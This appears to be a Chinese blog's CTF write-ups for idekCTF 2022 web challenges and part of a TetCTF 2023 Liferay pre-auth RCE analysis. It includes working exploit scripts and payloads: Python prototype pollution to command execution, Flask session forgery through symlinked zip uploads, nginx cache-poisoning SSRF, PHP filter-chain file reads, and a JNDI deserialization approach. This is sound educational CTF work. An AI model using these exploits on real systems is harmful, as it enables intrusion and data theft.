1234567891011121314151617FROM python:3.8.16-slim-bullseyeRUN apt update &amp;&amp; apt install -y xxdRUN python3 -m pip install flask pydashRUN echo &quot;idek&#123;[REDACTED]&#125;&quot; &gt; /flag-$(head -c 16 /dev/urandom | xxd -p).txtRUN useradd ctfUSER ctfWORKDIR /appCOPY . .ENTRYPOINT [&quot;python3&quot;, &quot;app.py&quot;] 最后调用COPY . .复制了所有的文件，看看文件结构这也就以为着把Dockerfile自身也复制进去了2333 姿势1可以看到这里有个_static_url_path属性，这是啥目录大家都知道一些静态资源文件都放下面 那么如果我们设置app._static_folder 为 / 接着访问 /static/etc/passwd 1&#123;&quot;task&quot;:&quot;__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.app._static_folder&quot;,&quot;status&quot;:&quot;/&quot;&#125; 任意文件读 姿势2从app.py当中看 123456@app.route(&quot;/&lt;path:path&gt;&quot;)def render_page(path): app._got_first_request = False if not os.path.exists(&quot;templates/&quot; + path): return &quot;not found&quot;, 404 return render_template(path) 如果我们访问/../app.py会怎么样呢，很显然报错了 我们可以看看flask的实现代码，在jinja2.loaders.FileSystemLoader.get_source 在这里首先通过split_template_path处理路径 如果我们路径当中带有..可以看到由于和os.path.pardir相等，导致抛出TemplateNotFound异常，也就是不允许跨目录 那如果我们污染了os.path.pardir那么这里就通过了条件，不会拦截 成功实现了跨目录读 预期RCE同时这里还有一个jinja_env属性我们可以看到很多有趣的属性比如auto_reload，这里还有识别模板的&#123;%%&#125;以及&#123;&#123;&#125;&#125; 姿势1那么到了这里如果我们能找到一个py文件，这个py文件里面有eval函数，那是不是我们就能成功rce了呢？这部分我和队友一直没找到，最后出题人提供了答案，在/usr/local/lib/python3.8/turtle.py 那么如果我们控制修改这个模板的标签，再配合污染os.path.pardir,那么是不是就能渲染任意文件顺利RCE了呢 提供一个出题人的exp 1234567891011121314151617181920212223242526272829303132333435363738import requestsimport rebase_url = &quot;http://localhost:1337&quot;#base_url = &quot;https://task-manager-dc512c530573c0b4.instancer.idek.team&quot;hijack_start = &quot;&quot;&quot;&#x27;&quot;&quot;&#x27;]:\\n value = &quot;&quot;&quot;hijack_end = &quot;\\n&quot;payloads = &#123; &quot;__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.app.env&quot;: &quot;yolo&quot;, &quot;__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.app.jinja_env.globals.value&quot;: &quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag-*.txt&#x27;).read()&quot;, &quot;__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.app.jinja_env.variable_start_string&quot;: hijack_start, &quot;__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.app.jinja_env.variable_end_string&quot;: hijack_end, &quot;__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.os.path.pardir&quot;: &quot;ZZZ&quot;, &quot;__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.app._got_first_request&quot;: None, &#125;def overwrite(attr, value): data = &#123;&quot;task&quot;: attr, &quot;status&quot;: value&#125; requests.post(base_url + &quot;/api/manage_tasks&quot;, json=data)def get_flag(): url = base_url + &quot;/../../usr/local/lib/python3.8/turtle.py&quot; s = requests.Session() r = requests.Request(method=&#x27;GET&#x27;, url=url) prep = r.prepare() prep.url = url r = s.send(prep) flag = re.findall(&#x27;idek&#123;.*&#125;&#x27;, r.text)[0] print(flag)for k, v in payloads.items(): overwrite(k, v)get_flag() 姿势2学习自国外友人https://github.com/Myldero/ctf-writeups/tree/master/idekCTF%202022/task%20manager 从编译入手很秀,在生成模板的过程中jinja2.compiler.CodeGenerator.visit_Template 如果我们污染了exported变量那么就可以控制模板的生成 正好是可以的 之后访问渲染任意模板的时候就能触发RCE，很厉害！ Proxy viewer比较有意思的题目，首先看看app.py中关键路由部分 123456789101112131415161718192021222324252627282930313233app = Flask( __name__, static_url_path=&#x27;/static&#x27;, static_folder=&#x27;./static&#x27;, )PREMIUM_TOKEN = os.urandom(32).hex()limiter = Limiter(app, key_func=get_remote_address)@app.after_requestdef add_headers(response): response.cache_control.max_age = 120 return response@app.route(&#x27;/&#x27;)def index(): return render_template(&#x27;index.html&#x27;)@app.route(&#x27;/proxy/&lt;path:path&gt;&#x27;)@limiter.limit(&quot;10/minute&quot;)def proxy(path): remote_addr = request.headers.get(&#x27;X-Forwarded-For&#x27;) or request.remote_addr is_authorized = request.headers.get(&#x27;X-Premium-Token&#x27;) == PREMIUM_TOKEN or remote_addr == &quot;127.0.0.1&quot; try: page = urlopen(path, timeout=.5) except: return render_template(&#x27;proxy.html&#x27;, auth=is_authorized) if is_authorized: output = page.read().decode(&#x27;latin-1&#x27;) else: output = f&quot;&lt;pre&gt;&#123;page.headers.as_string()&#125;&lt;/pre&gt;&quot; return render_template(&#x27;proxy.html&#x27;, auth=is_authorized, content=output) 其中比较关键的是这个/proxy路由，存在一个ssrf漏洞，但是必须is_authorized为true才会返回全部结果，否则只返回响应头 另一个关键的地方就是nginx的配置，可以看见如果以/static/开头那么就会缓存对应页面内容 同时可以看到对/开头的所有请求都会增加一个XFF头，因此对于上面的remote_addr我们无法进行伪造，因为nginx对此处理是追加ip，比如(XFF:127.0.0.1,readlip) 12345678910111213141516171819202122232425262728events &#123; worker_connections 1024;&#125;http &#123; include mime.types; proxy_cache_path /tmp/nginx keys_zone=my_zone:10m inactive=60m use_temp_path=off; server &#123; listen 1337; client_max_body_size 64M; location / &#123; proxy_set_header Host $http_host; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_pass http://localhost:3000; &#125; location ^~ /static/ &#123; proxy_pass http://localhost:3000; proxy_set_header Host $http_host; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_cache my_zone; add_header X-Proxy-Cache $upstream_cache_status; &#125; &#125;&#125; 这里还要用到一个trick就是，urlopen内部处理时会在urllib.request.Request.full_url中去除#后面部分 12345678910111213@full_url.setterdef full_url(self, url): # unwrap(&#x27;&lt;URL:type://host/path&gt;&#x27;) --&gt; &#x27;type://host/path&#x27; self._full_url = unwrap(url) self._full_url, self.fragment = _splittag(self._full_url) self._parse() def _splittag(url): &quot;&quot;&quot;splittag(&#x27;/path#tag&#x27;) --&gt; &#x27;/path&#x27;, &#x27;tag&#x27;.&quot;&quot;&quot; path, delim, tag = url.rpartition(&#x27;#&#x27;) if delim: return path, tag return url, None 因此配合这个trick，我们先访问 1http://127.0.0.1:1337/proxy/http://127.0.0.1:1337/proxy/file%3a///flag.txt%2523/../../../static/a 此时flask会把file%3a///flag.txt%2523/../../../static/a整体当作 而nginx则会对url做normalize处理，最终导致nginx识别请求为http://127.0.0.1:1337/static/a 再访问即可触发缓存 1http://127.0.0.1:1337/proxy/http://127.0.0.1:1337/proxy/file%3a///flag.txt%2523/../../../static/a SimpleFileServer也是python的flask的题目 可以看到获得flag的条件，那就是成为admin，所以很容易猜测到考点是session伪造，而flask里面这个session的生成通常和变量app.config[&quot;SECRET_KEY&quot;]息息相关 12345@app.route(&quot;/flag&quot;)def flag(): if not session.get(&quot;admin&quot;): return &quot;Unauthorized!&quot; return subprocess.run(&quot;./flag&quot;, shell=True, stdout=subprocess.PIPE).stdout.decode(&quot;utf-8&quot;) 因此一切的前提是我们能获得这个SECRET_KEY 1app.config[&quot;SECRET_KEY&quot;] = os.environ[&quot;SECRET_KEY&quot;] 而这部分生成在config.py当中 123SECRET_OFFSET = 0 # REDACTEDrandom.seed(round((time.time() + SECRET_OFFSET) * 1000))os.environ[&quot;SECRET_KEY&quot;] = &quot;&quot;.join([hex(random.randint(0, 15)) for x in range(32)]).replace(&quot;0x&quot;, &quot;&quot;) 要爆破这部分很明显一是我们需要知道这个time.time()的值，另一个还需要知道SECRET_OFFSET的偏移 除开注册与登录路由，upoad支持上传一个zip文件并解压到指定目录 12345678910111213141516171819@app.route(&quot;/upload&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])def upload(): if not session.get(&quot;uid&quot;): return redirect(&quot;/login&quot;) if request.method == &quot;GET&quot;: return render_template(&quot;upload.html&quot;) if &quot;file&quot; not in request.files: flash(&quot;You didn&#x27;t upload a file!&quot;, &quot;danger&quot;) return render_template(&quot;upload.html&quot;) file = request.files[&quot;file&quot;] uuidpath = str(uuid.uuid4()) filename = f&quot;&#123;DATA_DIR&#125;uploadraw/&#123;uuidpath&#125;.zip&quot; file.save(filename) subprocess.call([&quot;unzip&quot;, filename, &quot;-d&quot;, f&quot;&#123;DATA_DIR&#125;uploads/&#123;uuidpath&#125;&quot;]) flash(f&#x27;Your unique ID is &lt;a href=&quot;/uploads/&#123;uuidpath&#125;&quot;&gt;&#123;uuidpath&#125;&lt;/a&gt;!&#x27;, &quot;success&quot;) logger.info(f&quot;User &#123;session.get(&#x27;uid&#x27;)&#125; uploaded file &#123;uuidpath&#125;&quot;) return redirect(&quot;/upload&quot;) uploads/xxx路由支持我们之间读取上传解压后的文件内容 123456@app.route(&quot;/uploads/&lt;path:path&gt;&quot;)def uploads(path): try: return send_from_directory(DATA_DIR + &quot;uploads&quot;, path) except PermissionError: abort(404) 这个读文件部分按理说只能读取uploads下的文件，看看底层实现用的是safe_join不支持跨目录读取 可以看到在这里获取路径path后，最终调用open打开文件并返回内容 解决方法是可以配合symlink软连接实现任意文件读，这样我们一方面可以读config.py获取SECRET_OFFSET 另一方面为了得到时间 可以看到题目很良心的在server.log当中输出了time 12345678910# Configure loggingLOG_HANDLER = logging.FileHandler(DATA_DIR + &#x27;server.log&#x27;)LOG_HANDLER.setFormatter(logging.Formatter(fmt=&quot;[&#123;levelname&#125;] [&#123;asctime&#125;] &#123;message&#125;&quot;, style=&#x27;&#123;&#x27;))logger = logging.getLogger(&quot;application&quot;)logger.addHandler(LOG_HANDLER)logger.propagate = Falsefor handler in logging.root.handlers[:]: logging.root.removeHandler(handler)logging.basicConfig(level=logging.WARNING, format=&#x27;%(asctime)s %(levelname)s %(name)s %(threadName)s : %(message)s&#x27;)logging.getLogger().addHandler(logging.StreamHandler()) 不过这个时间不是精确的，通过转换为时间戳我们只能精确到整数部分，不过好在这里随机数的seed是配合round做了取整因此我们就能很容易实现爆破了 我们可以很方便配合这个信息得到time.time()的值 本地ln做一个symlink的文件 之后爆破到SECRET_KEY后，修改admin为true再生成session即可 1decoded = &#123;&#x27;admin&#x27;: True, &#x27;uid&#x27;: userinfo[&#x27;username&#x27;]&#125; 最终exp，配合flask_unsign 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758import base64import requests, re, time, datetime, randomimport flask_unsignsess = requests.session()SECRET_OFFSET = -67198624 * 1000userinfo = &#123;&quot;username&quot;: &quot;yyds&quot;, &quot;password&quot;: &quot;yyds&quot;&#125;baseurl = &quot;http://127.0.0.1:1337/&quot;pocZip = &quot;UEsDBAoAAAAAACJsMVZvT1MBDwAAAA8AAAAKABwAc2VydmVyLmxvZ1VUCQADDzPGYw8zxmN1eAsAAQT1AQAABBQAAAAvdG1wL3NlcnZlci5sb2dQSwMECgAAAAAAG2wxVuPo95IOAAAADgAAAAkAHABjb25maWcucHlVVAkAAwUzxmMFM8ZjdXgLAAEE9QEAAAQUAAAAL2FwcC9jb25maWcucHlQSwECHgMKAAAAAAAibDFWb09TAQ8AAAAPAAAACgAYAAAAAAAAAAAA7aEAAAAAc2VydmVyLmxvZ1VUBQADDzPGY3V4CwABBPUBAAAEFAAAAFBLAQIeAwoAAAAAABtsMVbj6PeSDgAAAA4AAAAJABgAAAAAAAAAAADtoVMAAABjb25maWcucHlVVAUAAwUzxmN1eAsAAQT1AQAABBQAAABQSwUGAAAAAAIAAgCfAAAApAAAAAAA&quot;cookie = &quot;&quot;log_url = &quot;&quot;def register(): reg_url = baseurl + &quot;register&quot; sess.post(reg_url, userinfo)def login(): global cookie set_cookie = sess.post(baseurl + &quot;login&quot;, data=userinfo, allow_redirects=False).headers[&#x27;Set-Cookie&#x27;] cookie = set_cookie[8:82]def upload(): global log_url log_url = re.search(&#x27;&lt;a href=&quot;/uploads/.*&quot;&gt;&#x27;, sess.post( baseurl + &quot;upload&quot;, headers=&#123;&#x27;Cookie&#x27;: f&#x27;session=&#123;cookie&#125;&#x27;&#125;, files=&#123;&#x27;file&#x27;: base64.b64decode(pocZip)&#125;).text).group()[9:-2]def read(): server_log = baseurl + log_url + &quot;/server.log&quot; config = baseurl + log_url + &quot;/config.py&quot; SECRET_OFFSET = int(re.findall(&quot;SECRET_OFFSET = (.*?) # REDACTED&quot;, sess.get(config).text)[0]) * 1000 log = sess.get(server_log).text now = (time.mktime(datetime.datetime.strptime(log.split(&#x27;\\n&#x27;)[0][1:20], &quot;%Y-%m-%d %H:%M:%S&quot;).timetuple())) * 1000 return SECRET_OFFSET,nowif __name__ == &#x27;__main__&#x27;: register() login() upload() SECRET_OFFSET, now = read() while 1: decoded = &#123;&#x27;admin&#x27;: True, &#x27;uid&#x27;: userinfo[&#x27;username&#x27;]&#125; random.seed(round(now + int(SECRET_OFFSET))) SECRET_KEY = &quot;&quot;.join([hex(random.randint(0, 15)) for x in range(32)]).replace(&quot;0x&quot;, &quot;&quot;) flag_url = baseurl + &quot;flag&quot; res = sess.get(flag_url, headers=&#123;&#x27;Cookie&#x27;: f&#x27;session=&#123;flask_unsign.sign(decoded, SECRET_KEY)&#125;&#x27;&#125;).text if &quot;idek&quot; not in res: now += 1 print(now) continue print(res) break ReadMe很简单签到题，算是个逻辑漏洞问题 这个程序中只有一个路由 1http.HandleFunc(&quot;/just-read-it&quot;, justReadIt) 首先简单看一下可以得出程序逻辑如果能成功走到justReadIt函数最下方就能获得flag 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152func justReadIt(w http.ResponseWriter, r *http.Request) &#123; defer r.Body.Close() body, err := ioutil.ReadAll(r.Body) if err != nil &#123; w.WriteHeader(500) w.Write([]byte(&quot;bad request\\n&quot;)) return &#125; reqData := ReadOrderReq&#123;&#125; if err := json.Unmarshal(body, &amp;reqData); err != nil &#123; w.WriteHeader(500) w.Write([]byte(&quot;invalid body\\n&quot;)) return &#125; if len(reqData.Orders) &gt; MaxOrders &#123; w.WriteHeader(500) w.Write([]byte(&quot;whoa there, max 10 orders!\\n&quot;)) return &#125; reader := bytes.NewReader(randomData) validator := NewValidator() ctx := context.Background() for _, o := range reqData.Orders &#123; if err := validator.CheckReadOrder(o); err != nil &#123; w.WriteHeader(500) w.Write([]byte(fmt.Sprintf(&quot;error: %v\\n&quot;, err))) return &#125; ctx = WithValidatorCtx(ctx, reader, int(o)) _, err := validator.Read(ctx) if err != nil &#123; w.WriteHeader(500) w.Write([]byte(fmt.Sprintf(&quot;failed to read: %v\\n&quot;, err))) return &#125; &#125; if err := validator.Validate(ctx); err != nil &#123; w.WriteHeader(500) w.Write([]byte(fmt.Sprintf(&quot;validation failed: %v\\n&quot;, err))) return &#125; w.WriteHeader(200) w.Write([]byte(os.Getenv(&quot;FLAG&quot;)))&#125; 我们一点一点来看，首先是接受了一个传来的json数据，解析保存到reqData当中，从下面可以看出只接收一个完全由数字组成的int数组，字段名叫orders 123type ReadOrderReq struct &#123; Orders []int `json:&quot;orders&quot;`&#125; 之后会用randomData初始化一个reader 1reader := bytes.NewReader(randomData) 而这个randomData则是由initRandomData函数初始化，记住这个password复制在了12625之后 12345678func initRandomData() &#123; rand.Seed(1337) randomData = make([]byte, 24576) if _, err := rand.Read(randomData); err != nil &#123; panic(err) &#125; copy(randomData[12625:], password[:])&#125; 初始化之后会遍历reqData.Orders 调用CheckReadOrder检查oders中的int值范围是否在0-100 123456func (v *Validator) CheckReadOrder(o int) error &#123; if o &lt;= 0 || o &gt; 100 &#123; return fmt.Errorf(&quot;invalid order %v&quot;, o) &#125; return nil&#125; 之后根据数值读出指定位数的值 12ctx = WithValidatorCtx(ctx, reader, int(o))_, err := validator.Read(ctx) 再往下就是最关键的地方，如果这里的validate校验过了才能拿到flag 12345678if err := validator.Validate(ctx); err != nil &#123; w.WriteHeader(500) w.Write([]byte(fmt.Sprintf(&quot;validation failed: %v\\n&quot;, err))) return &#125; w.WriteHeader(200) w.Write([]byte(os.Getenv(&quot;FLAG&quot;))) 这个函数功能就是读32位，之后与password比较，成功返回true，而我们前面说过这个password复制在了12625之后，并且oders数组容量最多只能有10个数字 1234567891011func (v *Validator) Validate(ctx context.Context) error &#123; r, _ := GetValidatorCtxData(ctx) buf, err := v.Read(WithValidatorCtx(ctx, r, 32)) if err != nil &#123; return err &#125; if bytes.Compare(buf, password[:]) != 0 &#123; return errors.New(&quot;invalid password&quot;) &#125; return nil&#125; 就算全取最大100，10个也才1000，距离我们的12625还差很远 再往前看发现read之前 123456789func (v *Validator) Read(ctx context.Context) ([]byte, error) &#123; r, s := GetValidatorCtxData(ctx) buf := make([]byte, s) _, err := r.Read(buf) if err != nil &#123; return nil, fmt.Errorf(&quot;read error: %v&quot;, err) &#125; return buf, nil&#125; 有这样一个调用，如果size大于等于100会调用一个bufio.NewReader 12345678func GetValidatorCtxData(ctx context.Context) (io.Reader, int) &#123; reader := ctx.Value(reqValReaderKey).(io.Reader) size := ctx.Value(reqValSizeKey).(int) if size &gt;= 100 &#123; reader = bufio.NewReader(reader) &#125; return reader, size&#125; 这个defaultBufSize是4096 1234// NewReader returns a new Reader whose buffer has the default size.func NewReader(rd io.Reader) *Reader &#123; return NewReaderSize(rd, defaultBufSize)&#125; 最终 Paywall想看原理的移步陆队之前写的，我是脚本小子 https://tttang.com/archive/1395/#toc_iconv-filter-chain 本题是用php实现的一个blog系统，除开样式读取核心代码非常简单 12345678910111213141516171819202122&lt;?php error_reporting(0); set_include_path(&#x27;articles/&#x27;); if (isset($_GET[&#x27;p&#x27;])) &#123; $article_content = file_get_contents($_GET[&#x27;p&#x27;], 1); if (strpos($article_content, &#x27;PREMIUM&#x27;) === 0) &#123; die(&#x27;Thank you for your interest in The idek Times, but this article is only for premium users!&#x27;); // TODO: implement subscriptions &#125; else if (strpos($article_content, &#x27;FREE&#x27;) === 0) &#123; echo &quot;&lt;article&gt;$article_content&lt;/article&gt;&quot;; die(); &#125; else &#123; die(&#x27;nothing here&#x27;); &#125; &#125; ?&gt; 可以看到，对于文章内容前是PREMIUM的不能读取，FREE的则可以读 很可惜我们的flag文件恰好前面也是PREMIUM，那么要想读取这个文件很显然我们可以配合php的filter构造出FREE四个字母也就可以实现读取了 下面是工具 https://github.com/synacktiv/php_filter_chain_generator https://github.com/WAY29/php_filter_chain_generator 发现直接生成出来的虽然有FREE，但是都无法看了 1FREE\u0001�B�5\u0005$TԕT�\u0002�\u0006�FV��F�F��U�E�7V&#x27;65#\u0016#\u0016�u�C\u0005��W%��7w5\u0004�\u0006\u0017\u0006W&quot;\u0017����&gt;==\u000f�\u000f@\u000fC�\u0003�\u0003����&gt;==\u000f�\u000f@\u000f 然而发现把每个环节的convert.iconv.UTF8.UTF7去掉 就可以变成明文了，脚本小子表示很神奇，最后为了不丢失符号(毕竟Base64字符里面没有一些特殊符号!&#123;&#125;!之类的)，因此第一步事先base64enccode一下 最终得到payload 1http://127.0.0.1/?p=php://filter/convert.base64-encode|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode/resource=flag 但是根据这样构造本地发现会少最后三个字符，除开}符号还剩两个 看看题目描述可以猜出最后俩字符，Th4nk_U_4_SubscR1b1ng_t0_our_n3wsPHPPaper，最后一个字母肯定是个符号所以是! 1idek&#123;Th4nk_U_4_SubscR1b1ng_t0_our_n3wsPHPaper!&#125; 当然最后发现工具也可以直接用，注意后面有俩空格 1python php_filter_chain_generator.py --chain &#x27;FREE &#x27; 得到 1php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=flag 本脚本小子觉得很有意思就是了","categories":[{"name":"CTF","slug":"CTF","permalink":"https://y4tacker.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://y4tacker.github.io/tags/CTF/"}]},{"title":"TetCTF2023&Liferay(CVE-2019-16891)(Pre-Auth RCE)","slug":"year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE","date":"2023-01-03T03:07:19.000Z","updated":"2024-08-04T09:01:49.726Z","comments":true,"path":"2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/","link":"","permalink":"https://y4tacker.github.io/2023/01/03/year/2023/1/TetCTF2023-Liferay-CVE-2019-16891-Pre-Auth-RCE/","excerpt":"","text":"TetCTF2023&amp;Liferay(CVE-2019-16891)(Pre-Auth RCE)这周末打了这个比赛挺不错的一个，但是主要还是写一下这题，其他题虽然也有难度但是并不值得我记录 正文首先这题被拆分为了两个部分，觉得两部分都挺有意思的，就单独讲讲 part1主要是利用node与python的requests的差异性绕过host限制 part2主要是仅仅通过一个GET触发Liferay的RCE 关于题目备份也是放在了我的Git里：https://github.com/Y4tacker/CTFBackup/tree/main/2023/TetCTF Part1首先一眼看到这个路由 1app.post(&#x27;/api/getImage&#x27;, isAdmin, validate, async (req, res, next) =&gt; &#123; 这里面有个鉴权操作，要求密码是Th!sIsS3xreT0但是长度不能大于12，很常规基础的考点了，通过数组就行?password[]=Th!sIsS3xreT0 12345678910const isAdmin = (req, res, next) =&gt; &#123; try &#123; if (req.query.password.length &gt; 12 || req.query.password != &quot;Th!sIsS3xreT0&quot;) &#123; return res.send(&quot;You don&#x27;t have permission&quot;) &#125; next(); &#125; catch (error) &#123; return res.status(500).send(&quot;Oops, something went wrong.&quot;); &#125;&#125; 接着来看看剩下的代码 123456789101112131415161718192021222324app.post(&#x27;/api/getImage&#x27;, isAdmin, validate, async (req, res, next) =&gt; &#123; try &#123; const url = req.body.url.toString() let result = &#123;&#125; if (IsValidProtocol(url)) &#123; const flag = isValidHost(url) if (flag) &#123; console.log(&quot;[DEBUG]: &quot; + url) let res = await downloadImage(url) result = res &#125; else &#123; result.status = false result.data = &quot;Invalid host i.ibb.co&quot; &#125; &#125; else &#123; result.status = false result.data = &quot;Invalid url&quot; &#125; res.json(result) &#125; catch (error) &#123; res.status(500).send(error.stack) &#125;&#125;) 这里IsValidProtocol要求只能是http/https，isValidHost要求host只能是i.ibb.co这个图床网站(使用urlParse解析) 之后如果校验成功则会调用python去下载 1234567891011121314151617181920212223242526272829f __name__ == &#x27;__main__&#x27;: try: if (len(sys.argv) &lt; 2): exit() url = sys.argv[1] headers = &#123;&#x27;user-agent&#x27;: &#x27;PythonBot/0.0.1&#x27;&#125; request = requests.session() request.mount(&#x27;file://&#x27;, LocalFileAdapter()) # check extentsion white_list_ext = (&#x27;.jpg&#x27;, &#x27;.png&#x27;, &#x27;.jpeg&#x27;, &#x27;.gif&#x27;) vaild_extension = url.endswith(white_list_ext) if (vaild_extension): # check content-type res = request.head(url, headers=headers, timeout=3) if (&#x27;image&#x27; in res.headers.get(&quot;Content-type&quot;) or &#x27;image&#x27; in res.headers.get(&quot;content-type&quot;) or &#x27;image&#x27; in res.headers.get(&quot;Content-Type&quot;)): r = request.get(url, headers=headers, timeout=3) print(base64.b64encode(r.content)) else: print(0) else: print(0) except Exception as e: # print e print(0) 正常情况来说如果我们使用：http://evil.com@i.ibb.co/1.png node和python经过parse后访问的其实也都是http://i.ibb.co/1.png 那有没有什么办法让node和py行为相异，python的requests库是基于urllib实现的，这里我们看到去区分scheme, authority, path, query, fragment等部分是靠正则实现的 对应的正则 12345678URI_RE = re.compile(r&quot;^(?:([a-zA-Z][a-zA-Z0-9+.-]*):)?&quot;r&quot;(?://([^\\\\/?#]*))?&quot; 靠这些符号决定authority部分边界r&quot;([^?#]*)&quot;r&quot;(?:\\?([^#]*))?&quot;r&quot;(?:#(.*))?$&quot;,re.UNICODE | re.DOTALL,) 因此如果最终我们使用的url是 http://evil.com1232\\@i.ibb.co/1.png node部分则会正确解析出host为i.ibb.co python部分由于遇到了\\字符其实是把后面整体当成了path，最终访问的url其实是 http://evil.com1232/\\@i.ibb.co/1.png 如图测试 在这个基础上我们可以配合flask简单写个解析这个畸形路径的请求并重定向到指定位置即可完成ssrf 123456789101112131415from flask import Flask,requestfrom urllib.parse import quoteimport requestsapp = Flask(__name__)@app.route(&#x27;/\\\\@i.ibb.co/1.png&#x27;)def hello_world(): return &quot;login fail&quot;, 302, [(&quot;Content-Type&quot;, &quot;image&quot;), (&quot;Location&quot;, &quot;file:///usr/src/app/fl4gg_tetCTF&quot;)] # return&quot;23333&quot;if __name__ == &#x27;__main__&#x27;: app.run(host=&quot;0.0.0.0&quot;,port=&quot;1239&quot;,debug=False) Part2第二部分是这个Liferay的一个前台RCE，看DockerFile可以看到这个版本 网上较多的是关于cve-2020-7961的内容，也就是靠/api/jsonws/xxxx去实现的RCE 然而这里有两个限制 第一个，从part1部分我们能得到一点，我们的SSRF只能触发一个GET请求 第二个，这里对路由做了些限制，也就是说我们的api相关路由都不能访问了咋办呢？ 关于这个我在网上搜索发现出题人曾发了一个这个文章 https://vsrc.vng.com.vn/blog/liferay-revisited-a-tale-of-20k/ 在文章最后提到了这点验证了我们的猜想，同时也知道了大概也是和json反序列化有关 之后的话又看到一篇文章 https://dappsec.substack.com/p/an-advisory-for-cve-2019-16891-from 这里像我们展示了一个新的路由 从struts-config.xml当中可以看到对应的全类名 1&lt;action path=&quot;/portal/portlet_url&quot; type=&quot;com.liferay.portal.action.PortletURLAction&quot; /&gt; 这个类在/liferay-portal-6.1.2-ce-ga3/tomcat-7.0.40/webapps/ROOT/WEB-INF/lib/portal-impl.jar!/com/liferay/portal/action/PortletURLAction.class下 从这里也可以看出是GET传参数也可以 再往下看，可以得知这里是可以触发liferay的json反序列化 这里我们挑重点来讲，最终反序列化会触发org.jabsorb.JSONSerializer#unmarshall 这里他会调用getSerializer去选择一个能满足反序列化该javaCLass的类 首先遍历serializableMap看有没有该javaClass直接对应映射的处理，这个serializableMap当中有很多，但大多都是一些基础类型的类的处理 没有的话它会继续遍历serializerList看看有没有能处理该类的，也就是其canSerialize返回true 我们只需要关注两个即可，其他的也是一些基础类型之类的不需要过多关注 一个是com.liferay.portal.json.jabsorb.serializer.LiferaySerializer 12345678910public boolean canSerialize(Class clazz, Class jsonClass) &#123; Constructor constructor = null; try &#123; constructor = clazz.getConstructor(); &#125; catch (Exception var4) &#123; &#125; return Serializable.class.isAssignableFrom(clazz) &amp;&amp; (jsonClass == null || jsonClass == JSONObject.class) &amp;&amp; constructor != null; &#125; 其对应的unmarshall方法当中，我们可以很清楚的看到只是通过一些反射去对class对应字段赋值 另一个是org.jabsorb.serializer.impl.BeanSerializer 123public boolean canSerialize(Class clazz, Class jsonClazz) &#123; return !clazz.isArray() &amp;&amp; !clazz.isPrimitive() &amp;&amp; !clazz.isInterface() &amp;&amp; (jsonClazz == null || jsonClazz == JSONObject.class); &#125; 其对应的unmarshall方法当中，则是调用对应的setter方法，这符合我们的要求 这两个类处理最大的区别就是javaClasss是否继承了Serializable接口，因此我们找恶意类条件就是不能继承Serializable接口，同时set方法有恶意操作，这种时候就去看fastjson和jackson的黑名单就可以了 比如jackson里面黑名单里的一个类刚好在我们liferay当中 同时其set方法有一个能直接触发jndi的 最终我们把这串代码放进之前的恶意flask触发重定向后，通过jndi攻击内网服务 